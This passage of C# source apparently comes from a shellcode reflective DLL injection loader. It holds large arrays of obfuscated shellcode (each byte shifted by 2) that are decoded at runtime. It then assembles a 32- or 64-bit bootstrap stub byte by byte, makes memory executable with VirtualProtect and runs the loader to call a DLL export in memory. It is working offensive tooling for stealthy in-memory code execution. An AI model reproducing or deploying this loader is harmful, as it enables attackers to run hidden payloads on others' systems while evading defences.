0x26, 0x16, 0x05, 0x13, 0x8b, 0x56, 0x26, 0x5e, 0x8f, 0x4c, 0x06, 0x8d, 0x03, 0x8b, 0x4e, 0x26, 0x16, 0x87, 0xc2, 0x11, 0x87, 0x79, 0x01, 0x01, 0x01, 0x8d, 0x7e, 0x26, 0x12, 0x11, 0xb9, 0x49, 0x08, 0x11, 0xb9, 0x51, 0x16, 0x87, 0xc2, 0x11, 0x86, 0xb9, 0x02, 0x02, 0x02, 0x8d, 0x76, 0x26, 0x5e, 0x8f, 0x71, 0x3e, 0x05, 0xeb, 0x4a, 0x85, 0x7f, 0xee, 0x02, 0x8b, 0x46, 0x26, 0x26, 0x11, 0x88, 0x96, 0x02, 0x02, 0x02, 0x8d, 0x4f, 0x02, 0x35, 0xd4, 0x44, 0x8d, 0xc3, 0xc3, 0xea, 0x1f, 0x25, 0xc4, 0x8d, 0xd3, 0xc3, 0xec, 0x20, 0x85, 0xe4, 0x03, 0xc3, 0xeb, 0x21, 0x87, 0xc2, 0x77, 0x1a, 0x87, 0xd4, 0x77, 0x09, 0x6c, 0x0a, 0x60, 0x6c, 0x03, 0xed, 0x07, 0x6c, 0x06, 0x60, 0x6c, 0x04, 0x87, 0xcb, 0x5a, 0x11, 0x46, 0xf2, 0xed, 0x2e, 0x87, 0xd4, 0x77, 0x19, 0x87, 0xcb, 0x77, 0x06, 0x6c, 0x12, 0xed, 0x17, 0x87, 0xd4, 0x77, 0x0d, 0x87, 0xcb, 0x76, 0x1a, 0xc0, 0x82, 0x02, 0x02, 0x02, 0xed, 0x13, 0x87, 0xcb, 0x77, 0x07, 0x6c, 0x22, 0x60, 0xed, 0x0a, 0x6c, 0x42, 0x87, 0xcb, 0x5a, 0x11, 0x47, 0xf2, 0x8d, 0x4f, 0x02, 0x8d, 0xc8, 0x0f, 0x02, 0x04, 0x02, 0x02, 0x83, 0xe3, 0x02, 0x02, 0x02, 0x06, 0x11, 0x46, 0xc8, 0x8d, 0xf2, 0x8f, 0x46, 0x26, 0x2a, 0x52, 0x8d, 0x47, 0xea, 0x58, 0x01, 0x77, 0xee, 0x05, 0xc5, 0x52, 0x01, 0x56, 0x26, 0x3e, 0x87, 0xc2, 0x11, 0x86, 0xee, 0xfe, 0x01, 0x01, 0x8d, 0x46, 0x26, 0x26, 0x85, 0xc7, 0x2a, 0x87, 0xc2, 0x11, 0x87, 0x54, 0x01, 0x01, 0x01, 0x8d, 0x79, 0x2a, 0x6c, 0x02, 0x6c, 0x02, 0x6c, 0x01, 0x05, 0xf5, 0x01, 0x56, 0x26, 0x3e, 0x35, 0xc2, 0x42, 0x52, 0x52, 0x55, 0x01, 0xd8, 0x85, 0x7e, 0x26, 0x62, 0x02, 0x76, 0x7e, 0x85, 0x81, 0x7e, 0x02, 0x76, 0x78, 0x8d, 0x51, 0x7a, 0x05, 0xcd, 0x8d, 0x43, 0x1a, 0x87, 0xc2, 0x76, 0x6c, 0x85, 0x7b, 0x16, 0x02, 0x76, 0x66, 0x8d, 0x6b, 0x22, 0x8d, 0x7b, 0x26, 0x05, 0xed, 0x85, 0x66, 0x26, 0x5e, 0x02, 0x05, 0xfd, 0x87, 0xc2, 0x76, 0x53, 0x8d, 0x77, 0x02, 0x05, 0xf5, 0x35, 0xd4, 0x11, 0xc0, 0x08, 0xc3, 0xcc, 0x0f, 0x05, 0xd2, 0x48, 0x82, 0x80, 0x01, 0x02, 0x77, 0xf3, 0x3b, 0x56, 0x26, 0x62, 0x76, 0x18, 0x8d, 0x46, 0x26, 0x5e, 0x85, 0xc7, 0x06, 0x42, 0x85, 0xc9, 0x04, 0x8b, 0x46, 0x26, 0x5e, 0x3d, 0x43, 0x1a, 0x74, 0xd2, 0xed, 0x21, 0x11, 0xb9, 0x19, 0x85, 0xfc, 0x01, 0x76, 0x19, 0x8d, 0x43, 0x1e, 0x01, 0x76, 0x26, 0x6a, 0x01, 0x76, 0x26, 0x6a, 0x8f, 0x06, 0x92, 0x8d, 0x06, 0x1a, 0x05, 0xc5, 0x01, 0xd2, 0x5b, 0x5b, 0x8d, 0xc5, 0x61, 0x60, 0x5f, 0x5d, 0x85, 0xc6, 0x4a, 0xc5, 0x85, 0xee, 0x12, 0x66, 0xa3, 0x32, 0x02, 0x02, 0x02, 0x55, 0x57, 0x58, 0x8d, 0x42, 0x0e, 0x59, 0x8b, 0x4e, 0x26, 0x1a, 0x8d, 0x72, 0x0e, 0xeb, 0x8c, 0x02, 0x02, 0x02, 0x8d, 0x48, 0x32, 0x35, 0xcb, 0x8d, 0x60, 0x2e, 0x8d, 0x38, 0x8b, 0x46, 0x26, 0x16, 0x8d, 0x44, 0x3e, 0x8d, 0x6e, 0x12, 0x7a, 0x8b, 0x6e, 0x26, 0x12, 0x87, 0xef, 0x76, 0x6f, 0xc3, 0xed, 0x12, 0x35, 0x01, 0x87, 0xdd, 0x76, 0x21, 0x8d, 0x6e, 0x26, 0x16, 0x8c, 0x06, 0x31, 0xc3, 0xcb, 0x0f, 0x3e, 0x63, 0x11, 0xc0, 0xc2, 0x7e, 0x05, 0x85, 0xc3, 0xe2, 0x05, 0xca, 0x49, 0x3d, 0xfd, 0x74, 0xeb, 0x8d, 0x6e, 0x26, 0x12, 0x8d, 0x46, 0x2c, 0x22, 0x35, 0xdd, 0x8d, 0x7e, 0x2c, 0x1a, 0x05, 0xc4, 0x8b, 0x7e, 0x26, 0x16, 0x87, 0x01, 0x76, 0x33, 0x8d, 0x2a, 0x35, 0x01, 0x05, 0xec, 0x85, 0xc2, 0x06, 0x8b, 0x46, 0x26, 0x1e, 0x11, 0xc0, 0x47, 0x02, 0xc3, 0xd1, 0x0f, 0x05, 0xfa, 0x47, 0x82, 0x7f, 0x01, 0x02, 0x77, 0xf2, 0x8f, 0x06, 0x11, 0x3d, 0x46, 0x26, 0x1a, 0x76, 0x22, 0x8d, 0x46, 0x26, 0x1e, 0x45, 0x3d, 0x5e, 0x26, 0x16, 0x74, 0xd1, 0x8d, 0x58, 0x1a, 0x87, 0xd4, 0x11, 0x87, 0x6d, 0x01, 0x01, 0x01, 0x35, 0xc2, 0x61, 0x60, 0x5f, 0x5d, 0x85, 0xc6, 0x12, 0xc5, 0x8d, 0x76, 0x26, 0x12, 0x8d, 0x46, 0x18, 0x26, 0x8f, 0x06, 0x5a, 0x11, 0xb9, 0x0e, 0x12, 0x8d, 0x46, 0x18, 0x1e, 0x8f, 0x06, 0x8a, 0x8d, 0x06, 0x12, 0x05, 0xc4, 0xed, 0xdd };
            var buf2 = new byte[1485] { 0x4a, 0x8d, 0xc6, 0x46, 0x8b, 0x4a, 0x22, 0x4e, 0x8b, 0x42, 0x1a, 0x8b, 0x52, 0x12, 0x55, 0x57, 0x58, 0x59, 0x43, 0x56, 0x43, 0x57, 0x43, 0x58, 0x43, 0x59, 0x4a, 0x85, 0xee, 0x7a, 0x85, 0x62, 0x0a, 0x02, 0x4a, 0x8d, 0xeb, 0xbb, 0x4e, 0x79, 0x28, 0x09, 0x46, 0x8d, 0xfc, 0x35, 0xdd, 0xea, 0xa6, 0x06, 0x02, 0x02, 0xbb, 0x4b, 0xf9, 0x04, 0x7a, 0x4e, 0x8d, 0xea, 0xea, 0x99, 0x06, 0x02, 0x02, 0xbb, 0x5a, 0xa6, 0x55, 0xe7, 0x4a, 0x8b, 0x46, 0x26, 0x22, 0xea, 0x8a, 0x06, 0x02, 0x02, 0xbb, 0x12, 0xe3, 0x8c, 0xc5, 0x4a, 0x8d, 0xf2, 0xea, 0x7d, 0x06, 0x02, 0x02, 0xbb, 0xb1, 0xb3, 0x5e, 0x96, 0x4a, 0x8b, 0x46, 0x26, 0x32, 0xea, 0x6e, 0x06, 0x02, 0x02, 0xbb, 0x35, 0x02, 0xa0, 0x97, 0x4a, 0x8b, 0x46, 0x26, 0x2a, 0x4e, 0x8d, 0xe2, 0xea, 0x5c, 0x06, 0x02, 0x02, 0x4a, 0x65, 0x7f, 0x3e, 0x4e, 0x8d, 0xd2, 0x4a, 0x05, 0xff, 0x83, 0x41, 0x52, 0x47, 0x02, 0x02, 0x76, 0x09, 0x35, 0xc2, 0xeb, 0x2f, 0x06, 0x02, 0x02, 0xba, 0x66, 0x88, 0x02, 0x02, 0x68, 0x3b, 0x49, 0x06, 0x77, 0xf0, 0x43, 0xc0, 0x03, 0x02, 0x02, 0x02, 0x46, 0x86, 0x79, 0x3a, 0x77, 0xe4, 0x11, 0xb9, 0x49, 0x08, 0x11, 0xb9, 0x51, 0x16, 0x46, 0x8d, 0x51, 0x3a, 0x87, 0xc2, 0x76, 0x2e, 0x4a, 0x8f, 0x59, 0x26, 0x46, 0x8d, 0xc2, 0x4a, 0x05, 0xd3, 0x8d, 0x4c, 0x06, 0x87, 0xcb, 0x77, 0x09, 0x8d, 0x04, 0x4b, 0x05, 0xc3, 0xed, 0x06, 0x8d, 0x04, 0x05, 0xc3, 0x4a, 0x3d, 0xc5, 0x4a, 0x11, 0x49, 0xda, 0x4a, 0x85, 0xc4, 0x2a, 0x4f, 0x2d, 0xc8, 0x77, 0xe0, 0x4a, 0x8f, 0x4e, 0x26, 0x3a, 0x43, 0x01, 0xd4, 0x46, 0x8d, 0x46, 0x26, 0x3e, 0x46, 0x8d, 0x51, 0x52, 0x43, 0x8f, 0x42, 0x01, 0xf9, 0xd2, 0x43, 0x8f, 0x52, 0x01, 0x43, 0x05, 0xd3, 0x4b, 0x8f, 0x4a, 0x01, 0x4a, 0x25, 0xd2, 0x4a, 0x05, 0xcd, 0x4b, 0x8f, 0x42, 0x01, 0x4a, 0xf9, 0xd2, 0x4a, 0x25, 0xca, 0x4a, 0x3d, 0xd3, 0x11, 0x87, 0x6d, 0x01, 0x01, 0x01, 0x35, 0xcb, 0x43, 0x8d, 0xd3, 0x43, 0xba, 0x02, 0x32, 0x02, 0x02, 0x46, 0x8f, 0x4b, 0x06, 0x01, 0xd8, 0x46, 0x8d, 0x49, 0x56, 0x35, 0xd4, 0x4a, 0x8d, 0xf2, 0x4e, 0x8d, 0xd7, 0x4a, 0x8d, 0xca, 0x46, 0x8f, 0x5c, 0x04, 0x4f, 0x87, 0xc2, 0x76, 0x41, 0x46, 0x8d, 0x8e, 0x26, 0xe2, 0x02, 0x02, 0x02, 0x47, 0x25, 0xd0, 0x4f, 0x2d, 0xc8, 0x47, 0x87, 0xcb, 0x76, 0x1b, 0x4a, 0x8d, 0xc9, 0x4a, 0x2d, 0xc7, 0x4a, 0x3d, 0xd2, 0x75, 0x10, 0x4a, 0x8f, 0x44, 0xc6, 0x4b, 0x3d, 0xc5, 0x78, 0x07, 0xc8, 0x03, 0x02, 0xed, 0x07, 0x43, 0x8c, 0x04, 0x8a, 0x03, 0x4b, 0x05, 0xd8, 0x4f, 0x05, 0xd8, 0x4b, 0x05, 0xd0, 0x4f, 0x87, 0xc2, 0x77, 0xce, 0x46, 0x11, 0xb9, 0x59, 0x08, 0x11, 0xb9, 0x49, 0x16, 0x4f, 0x87, 0xd4, 0x76, 0x3a, 0x4a, 0x8f, 0x51, 0x2e, 0x4a, 0x05, 0xca, 0x8d, 0x53, 0xfa, 0x4f, 0x2d, 0xd8, 0x46, 0x8d, 0x03, 0x4a, 0x05, 0xd8, 0x46, 0x8d, 0x4b, 0xfe, 0x4e, 0x05, 0xc7, 0x4f, 0x87, 0xcb, 0x76, 0x12, 0x43, 0x8c, 0x02, 0x4f, 0x05, 0xc8, 0x8a, 0x04, 0x4b, 0x05, 0xd8, 0x4f, 0x2d, 0xd0, 0x77, 0xf2, 0x4a, 0x85, 0xc3, 0x2a, 0x4f, 0x87, 0xd4, 0x77, 0xd1, 0x8d, 0xa1, 0x92, 0x02, 0x02, 0x02, 0x4a, 0x05, 0xe0, 0x8d, 0x45, 0x0e, 0x87, 0xc2, 0x11, 0x86, 0x8c, 0x02, 0x02, 0x02, 0x4a, 0x8d, 0x6e, 0x26, 0x22, 0x8d, 0xca, 0x4a, 0x05, 0xd0, 0x43, 0x01, 0xd7, 0x46, 0x8d, 0x3d, 0x4e, 0x8d, 0xe2, 0x46, 0x8d, 0x75, 0x12, 0x4e, 0x05, 0x00, 0x4e, 0x05, 0xf8, 0xed, 0x4b, 0x4b, 0x85, 0x41, 0x02, 0x7f, 0x2b, 0x4b, 0x65, 0x46, 0x26, 0x3e, 0x43, 0x11, 0xb9, 0x19, 0x44, 0x8d, 0x8e, 0x22, 0x8a, 0x02, 0x02, 0x02, 0x44, 0x8d, 0x46, 0x23, 0x12, 0x44, 0x8d, 0x4e, 0x23, 0x1e, 0x4a, 0x2d, 0xd2, 0x4b, 0x05, 0xce, 0x8d, 0x06, 0x93, 0x4b, 0x05, 0xc6, 0xed, 0x11, 0x4b, 0x8d, 0x18, 0x4b, 0x8d, 0xce, 0x4a, 0x85, 0xc4, 0x04, 0x4a, 0x05, 0xd8, 0x01, 0xd7, 0x4b, 0x8b, 0x08, 0x4b, 0x85, 0xc8, 0x0a, 0x4b, 0x85, 0xc9, 0x0a, 0x4b, 0x85, 0x40, 0x02, 0x77, 0xb3, 0x8d, 0x45, 0x22, 0x4a, 0x85, 0xc5, 0x16, 0x87, 0xc2, 0x77, 0x8e, 0x46, 0x8d, 0xbe, 0x26, 0xca, 0x02, 0x02, 0x02, 0x46, 0x8f, 0x72, 0x03, 0x4e, 0x8d, 0x66, 0x26, 0x2a, 0x4e, 0x8d, 0xd0, 0x43, 0xbf, 0x04, 0x02, 0x02, 0x02, 0x4e, 0x2d, 0x51, 0x32, 0x85, 0xc1, 0xb6, 0x02, 0x02, 0x02, 0x02, 0x11, 0x86, 0x97, 0x02, 0x02, 0x02, 0x8d, 0x99, 0xb2, 0x02, 0x02, 0x02, 0x4a, 0x05, 0xd8, 0x8d, 0x44, 0x06, 0x87, 0xc2, 0x11, 0x86, 0x83, 0x02, 0x02, 0x02, 0xbd, 0x01, 0x11, 0x02, 0x02, 0x46, 0x8d, 0x04, 0x4e, 0x8f, 0x5c, 0x0a, 0x46, 0x8d, 0xd2, 0x4e, 0x05, 0xc8, 0x4b, 0x85, 0xec, 0x0a, 0x4b, 0xd3, 0xec, 0x76, 0x5b, 0x43, 0x11, 0xb9, 0x0d, 0x4f, 0x2d, 0xd8, 0x11, 0xb9, 0xc3, 0x68, 0xc3, 0xea, 0x0e, 0x68, 0x85, 0xfa, 0x0c, 0x77, 0x0b, 0x4a, 0x25, 0xcd, 0x50, 0x03, 0x0e, 0x03, 0xed, 0x36, 0x68, 0x85, 0xfa, 0x05, 0x77, 0x0b, 0x4a, 0x25, 0xcd, 0x48, 0x03, 0x0e, 0x03, 0xed, 0x27, 0x68, 0x43, 0x3d, 0xc8, 0x77, 0x13, 0x4a, 0x25, 0xcd, 0x4b, 0x8d, 0xc3, 0x4a, 0xc3, 0xea, 0x12, 0x68, 0x44, 0x03, 0x06, 0x03, 0xed, 0x10, 0x68, 0x43, 0x3d, 0xc7, 0x77, 0x0a, 0x4a, 0x25, 0xcd, 0x68, 0x48, 0x03, 0x0e, 0x03, 0x4f, 0x05, 0xdf, 0x4f, 0x87, 0xd4, 0x77, 0xa9, 0x8d, 0x44, 0x06, 0x4a, 0x05, 0xd2, 0x8d, 0x44, 0x06, 0x87, 0xc2, 0x77, 0x86, 0x11, 0xb9, 0x71, 0x08, 0x11, 0xb9, 0x49, 0x16, 0x4a, 0x87, 0xef, 0x11, 0x86, 0xd1, 0x02, 0x02, 0x02, 0x8d, 0x9e, 0x26, 0xc2, 0x02, 0x02, 0x02, 0x4e, 0x8f, 0x79, 0x3e, 0x4e, 0x8d, 0x6e, 0x26, 0x32, 0x4e, 0x05, 0xf2, 0x4a, 0x01, 0xcf, 0x43, 0x85, 0x80, 0xee, 0x02, 0x11, 0x88, 0x9f, 0x02, 0x02, 0x02, 0x47, 0x8d, 0x08, 0x43, 0x8d, 0xd2, 0xc3, 0xec, 0x20, 0x43, 0x8d, 0xc2, 0x43, 0x8d, 0xca, 0xc3, 0xea, 0x1f, 0x85, 0xe4, 0x03, 0xc3, 0xeb, 0x21, 0x85, 0xe2, 0x03, 0x77, 0x20, 0x87, 0xd4, 0x77, 0x0d, 0xf9, 0xdb, 0x1d, 0xdd, 0x85, 0xe5, 0x09, 0x01, 0xc5, 0xed, 0x40, 0xf9, 0xdb, 0xba, 0x04, 0x02, 0x02, 0x02, 0x1d, 0xdd, 0x25, 0xda, 0x05, 0xda, 0xed, 0x31, 0x87, 0xd4, 0x77, 0x1a, 0x87, 0xcb, 0x77, 0x07, 0x8f, 0x5c, 0x12, 0xed, 0x24, 0x87, 0xd4, 0x77, 0x0d, 0x87, 0xcb, 0x76, 0x1c, 0xbd, 0x82, 0x02, 0x02, 0x02, 0xed, 0x15, 0x87, 0xcb, 0x77, 0x07, 0x8f, 0x5b, 0x22, 0xed, 0x0c, 0x87, 0xcb, 0xba, 0x42, 0x02, 0x02, 0x02, 0x11, 0x47, 0xda, 0x43, 0x8d, 0x50, 0xea, 0x4e, 0x8f, 0x8e, 0x26, 0xc2, 0x02, 0x02, 0x02, 0x43, 0x8d, 0x58, 0xee, 0x8d, 0xc5, 0x11, 0xbc, 0xea, 0x0b, 0x43, 0x83, 0xe2, 0x02, 0x02, 0x02, 0x06, 0x11, 0x46, 0xc5, 0x4a, 0x05, 0xd0, 0x46, 0x8d, 0xc2, 0x8d, 0xda, 0x43, 0x01, 0xd7, 0x87, 0xc2, 0x11, 0x86, 0xa3, 0xfe, 0x01, 0x01, 0x4b, 0x85, 0xc8, 0x2a, 0x4a, 0x87, 0xef, 0x11, 0x87, 0x4a, 0x01, 0x01, 0x01, 0x46, 0x8f, 0x6f, 0x04, 0x8d, 0x61, 0x2a, 0x47, 0x35, 0xc2, 0x35, 0xd4, 0x4a, 0x85, 0xcb, 0x01, 0x4a, 0x05, 0xe0, 0x43, 0x01, 0xd6, 0xbf, 0x03, 0x02, 0x02, 0x02, 0x4a, 0x8d, 0xd0, 0x46, 0x8d, 0xc7, 0x8d, 0xd7, 0x01, 0xd5, 0x47, 0x87, 0x01, 0x11, 0x86, 0x99, 0x02, 0x02, 0x02, 0x85, 0xc1, 0x8e, 0x02, 0x02, 0x02, 0x02, 0x11, 0x86, 0x8c, 0x02, 0x02, 0x02, 0x8d, 0x99, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x05, 0xd8, 0x46, 0x8d, 0x5c, 0x1a, 0x47, 0x87, 0xdd, 0x76, 0x7a, 0x85, 0x7c, 0x16, 0x02, 0x76, 0x74, 0x46, 0x8d, 0x54, 0x22, 0x35, 0xdd, 0x46, 0x8d, 0x4c, 0x26, 0x4e, 0x05, 0xd8, 0x4e, 0x05, 0xd0, 0x47, 0x87, 0xdd, 0x76, 0x5f, 0x47, 0x8d, 0x04, 0x4e, 0x05, 0xc8, 0x35, 0xcb, 0x43, 0x11, 0xc0, 0x02, 0x4e, 0x05, 0xc7, 0xc3, 0xcb, 0x0f, 0x05, 0xca, 0x43, 0x82, 0x7a, 0x01, 0x02, 0x77, 0xef, 0x46, 0x3d, 0xfb, 0x76, 0x12, 0x05, 0xdf, 0x4b, 0x85, 0xc4, 0x06, 0x4f, 0x05, 0xcf, 0x43, 0x3d, 0xdd, 0x74, 0xd4, 0xed, 0x2f, 0x43, 0x11, 0xb9, 0x03, 0x85, 0xfa, 0x01, 0x76, 0x26, 0x8d, 0x54, 0x1e, 0x4a, 0x8d, 0x8e, 0x26, 0xd2, 0x02, 0x02, 0x02, 0xc3, 0xe2, 0x04, 0x4a, 0x9a, 0x4a, 0x05, 0xc8, 0x46, 0x8d, 0x06, 0x04, 0x8d, 0x96, 0x26, 0xda, 0x02, 0x02, 0x02, 0x4e, 0x05, 0xc8, 0x43, 0x01, 0xd2, 0x4a, 0x8d, 0xc8, 0x4a, 0x85, 0xc6, 0x7a, 0x43, 0x61, 0x43, 0x60, 0x43, 0x5f, 0x43, 0x5e, 0x61, 0x60, 0x5f, 0x5d, 0xc5, 0xce, 0xce, 0xce, 0x4a, 0x8b, 0x5e, 0x26, 0x0a, 0x4a, 0x8b, 0x76, 0x26, 0x12, 0x59, 0x4a, 0x85, 0xee, 0x12, 0x67, 0x4a, 0x8d, 0x06, 0x27, 0x62, 0x02, 0x02, 0x02, 0x8d, 0xf3, 0x4a, 0x8d, 0x52, 0x1a, 0x4e, 0x8d, 0x4c, 0x12, 0x4f, 0x8d, 0x43, 0x32, 0x4f, 0x87, 0xc2, 0x11, 0x86, 0xb6, 0x02, 0x02, 0x02, 0x43, 0x11, 0x12, 0x43, 0x5a, 0x4b, 0x65, 0x42, 0x3e, 0x35, 0xd4, 0x4f, 0x8d, 0x0b, 0xf5, 0x11, 0x81, 0x06, 0x26, 0x44, 0x8d, 0x9e, 0x02, 0x8a, 0x02, 0x02, 0x02, 0x87, 0xdd, 0x76, 0xd6, 0x4a, 0x8d, 0x06, 0x26, 0x4a, 0xc3, 0xea, 0x12, 0x46, 0x11, 0xb9, 0xd2, 0x47, 0x87, 0xd4, 0x76, 0x23, 0x4a, 0x8d, 0x4e, 0x26, 0x0a, 0x47, 0x8d, 0xdc, 0x11, 0xc0, 0x03, 0xc3, 0xcc, 0x0f, 0x82, 0x3b, 0x63, 0x7e, 0x05, 0x85, 0xc4, 0xe2, 0x05, 0xd2, 0x4a, 0x01, 0xc3, 0x4b, 0x85, 0xed, 0x03, 0x77, 0xe9, 0x4f, 0x8f, 0x16, 0x1a, 0x35, 0xcb, 0x43, 0x8d, 0x7c, 0x22, 0x4b, 0x05, 0xfa, 0x43, 0x3b, 0x4c, 0x1a, 0x78, 0x91, 0x8d, 0x21, 0x47, 0x35, 0xdd, 0x4b, 0x05, 0xda, 0x4a, 0x8f, 0x81, 0x06, 0x11, 0xc0, 0x05, 0x4a, 0x01, 0xc5, 0x43, 0xc3, 0xcd, 0x0f, 0x46, 0x05, 0xda, 0x82, 0x7d, 0x01, 0x02, 0x77, 0xef, 0x43, 0x8f, 0x06, 0x15, 0x3d, 0xc8, 0x76, 0x0f, 0x01, 0xc3, 0x43, 0x3d, 0x4c, 0x1a, 0x74, 0xd3, 0xeb, 0x5d, 0x01, 0x01, 0x01, 0x43, 0x8d, 0x44, 0x26, 0x05, 0xcb, 0x4b, 0x05, 0xc2, 0x11, 0xb9, 0x16, 0x03, 0x43, 0x8d, 0x4c, 0x1e, 0x4b, 0x05, 0xca, 0x8d, 0x06, 0x93, 0x4b, 0x05, 0xc2, 0xed, 0x04, 0x35, 0xc2, 0x4a, 0x8d, 0x5e, 0x26, 0x22, 0x4a, 0x8d, 0x76, 0x26, 0x2a, 0x4a, 0x85, 0xc6, 0x12, 0x61, 0xc5 };

            byte[] rdiShellcode32 = new byte[buf1.Length];
            for (int i = 0; i < rdiShellcode32.Length; i++)
            {
                rdiShellcode32[i] = (byte)(((uint)buf1[i] - 2) & 0xFF);
            }

            byte[] rdiShellcode64 = new byte[buf2.Length];
            for (int i = 0; i < rdiShellcode64.Length; i++)
            {
                rdiShellcode64[i] = (byte)(((uint)buf2[i] - 2) & 0xFF);
            }

            var newShellcode = new List<byte>();

            uint dllOffset = 0;

            if (PE.Is64BitDLL(dllBytes))
            {
                var rdiShellcode = rdiShellcode64;
                int bootstrapSize = 64;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // Set the offset to our DLL from pop result
                dllOffset = (uint)(bootstrapSize - newShellcode.Count + rdiShellcode.Length);

                // pop rcx - Capture our current location in memory
                newShellcode.Add(0x59);

                // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
                newShellcode.Add(0x49);
                newShellcode.Add(0x89);
                newShellcode.Add(0xc8);

                // Setup the location of the DLL into RCX
                // add rcx, <Offset of the DLL>
                newShellcode.Add(0x48);
                newShellcode.Add(0x81);
                newShellcode.Add(0xc1);
                foreach (byte b in BitConverter.GetBytes(dllOffset))
                    newShellcode.Add(b);

                // mov edx, <Hash of function>
                newShellcode.Add(0xba);
                foreach (byte b in BitConverter.GetBytes(functionHash))
                    newShellcode.Add(b);

                // Put the location of our user data in 
                // add r8, <Offset of the DLL> + <Length of DLL>
                newShellcode.Add(0x49);
                newShellcode.Add(0x81);
                newShellcode.Add(0xc0);
                foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                    newShellcode.Add(b);

                // mov r9d, <Length of User Data>
                newShellcode.Add(0x41);
                newShellcode.Add(0xb9);
                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                    newShellcode.Add(b);

                // push rsi - save original value
                newShellcode.Add(0x56);

                // mov rsi, rsp - store our current stack pointer for later
                newShellcode.Add(0x48);
                newShellcode.Add(0x89);
                newShellcode.Add(0xe6);

                // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
                newShellcode.Add(0x48);
                newShellcode.Add(0x83);
                newShellcode.Add(0xe4);
                newShellcode.Add(0xf0);

                // sub rsp, 0x30 - Create some breathing room on the stack 
                newShellcode.Add(0x48);
                newShellcode.Add(0x83);
                newShellcode.Add(0xec);
                newShellcode.Add(6 * 8); // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

                // mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
                newShellcode.Add(0xc7);
                newShellcode.Add(0x44);
                newShellcode.Add(0x24);
                newShellcode.Add(4 * 8);
                foreach (byte b in BitConverter.GetBytes((uint)flags))
                    newShellcode.Add(b);

                // call - Transfer execution to the RDI
                newShellcode.Add(0xe8);
                newShellcode.Add((byte)(bootstrapSize - newShellcode.Count - 4)); // Skip over the remainder of instructions
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // mov rsp, rsi - Reset our original stack pointer
                newShellcode.Add(0x48);
                newShellcode.Add(0x89);
                newShellcode.Add(0xf4);

                // pop rsi - Put things back where we left them
                newShellcode.Add(0x5e);

                // ret - return to caller
                newShellcode.Add(0xc3);

                // Write the rest of RDI
                foreach (byte b in rdiShellcode)
                    newShellcode.Add(b);

                // Write our DLL
                foreach (byte b in dllBytes)
                    newShellcode.Add(b);

                // Write our userdata
                foreach (byte b in userData)
                    newShellcode.Add(b);

            }
            else // 32 Bit
            {
                var rdiShellcode = rdiShellcode32;
                int bootstrapSize = 45;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode.Add(0xe8);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // Set the offset to our DLL from pop result
                dllOffset = (uint)(bootstrapSize - newShellcode.Count + rdiShellcode.Length);

                // pop ecx - Capture our current location in memory
                newShellcode.Add(0x58);

                // mov ebx, eax - copy our location in memory to ebx before we start modifying eax
                newShellcode.Add(0x89);
                newShellcode.Add(0xc3);

                // add eax, <Offset to the DLL>
                newShellcode.Add(0x05);
                foreach (byte b in BitConverter.GetBytes(dllOffset))
                    newShellcode.Add(b);

                // add ebx, <Offset to the DLL> + <Size of DLL>
                newShellcode.Add(0x81);
                newShellcode.Add(0xc3);
                foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                    newShellcode.Add(b);

                // push <Flags>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes(flags))
                    newShellcode.Add(b);

                // push <Length of User Data>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                    newShellcode.Add(b);

                // push ebx
                newShellcode.Add(0x53);

                // push <hash of function>
                newShellcode.Add(0x68);
                foreach (byte b in BitConverter.GetBytes(functionHash))
                    newShellcode.Add(b);

                // push eax
                newShellcode.Add(0x50);

                // call - Transfer execution to the RDI
                newShellcode.Add(0xe8);
                newShellcode.Add((byte)(bootstrapSize - newShellcode.Count - 4)); // Skip over the remainder of instructions
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);
                newShellcode.Add(0x00);

                // add esp, 0x14 - correct the stack pointer
                newShellcode.Add(0x83);
                newShellcode.Add(0xc4);
                newShellcode.Add(0x14);

                // ret - return to caller
                newShellcode.Add(0xc3);

                //Write the rest of RDI
                foreach (byte b in rdiShellcode)
                    newShellcode.Add(b);

                //Write our DLL
                dllBytes[0] = 0x00;
                dllBytes[1] = 0x00;
                foreach (byte b in dllBytes)
                    newShellcode.Add(b);

                //Write our userdata
                foreach (byte b in userData)
                    newShellcode.Add(b);
            }

            return newShellcode.ToArray();
        }

        public static void CallExportedFunction(byte[] dll, string exportName, byte[] argumentBytes)
        {
            byte[] shellcode = null;

            // 0x30627745 - 'SayHello' - FunctionToHash.py (Meh, I'm too lazy to change this)
            shellcode = RDILoader.ConvertToShellcode(dll, 0x30627745, argumentBytes, 0);
            Console.WriteLine("[+] Converted DLL to shellcode");

            GCHandle scHandle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr scPointer = scHandle.AddrOfPinnedObject();
            uint flOldProtect;

            // Only set the first page to RWX
            // This is should sufficiently cover the sRDI shellcode up top
            if (!Native.VirtualProtect(scPointer, (UIntPtr)4096, Native.PAGE_EXECUTE_READWRITE, out flOldProtect))
            {
                Console.WriteLine("[!] Failed to set memory flags");
                return;
            }

            ReflectiveLoader reflectiveLoader = (ReflectiveLoader)Marshal.GetDelegateForFunctionPointer(scPointer, typeof(ReflectiveLoader));

            Console.WriteLine("[+] Executing RDI");

            IntPtr peLocation = reflectiveLoader();

            IntPtr expFunctionLocation = PE.GetProcAddressR(peLocation, exportName);
            if (expFunctionLocation != IntPtr.Zero)
            {
                ExportedFunction exportedFunction = (ExportedFunction)Marshal.GetDelegateForFunctionPointer(expFunctionLocation, typeof(ExportedFunction));
